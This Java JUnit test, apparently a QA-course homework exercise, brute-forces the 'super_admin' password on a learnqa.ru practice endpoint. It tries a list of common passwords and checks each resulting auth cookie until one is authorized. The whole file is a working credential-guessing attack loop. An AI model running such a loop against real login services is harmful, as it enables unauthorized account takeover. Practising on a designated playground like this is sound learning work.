import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

public class Ex9 {

    @Test
    public void PasswordTest() {

        String linkAuthPassword = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String linkAuthCookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String login = "super_admin";

        List<String> knownPasswords = Arrays.asList(
                "123456", "password", "123456789", "12345678", "12345",
                "111111", "1234567", "sunshine", "qwerty", "iloveyou",
                "princess", "admin", "welcome", "666666", "abc123",
                "football", "123123", "monkey", "654321", "!@#$%^&*",
                "charlie", "aa123456", "donald", "password1", "qwerty123");

        for (String password:knownPasswords) {
            Response findPassword = RestAssured
                    .given()
                    .formParam("login", login)
                    .formParam("password", password)
                    .when()
                    .post(linkAuthPassword)
                    .then()
                    .statusCode(200)
                    .extract().response();

            String authCookieValue = findPassword.getCookie("auth_cookie");

            Response checkResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookieValue)
                    .get(linkAuthCookie)
                    .then()
                    .statusCode(200)
                    .extract().response();

            String result = checkResponse.asString();

            if(!result.contains("You are NOT authorized")) {
                System.out.println("Password: " + password);
                System.out.println(result);
                break;
            }
        }
    }
}

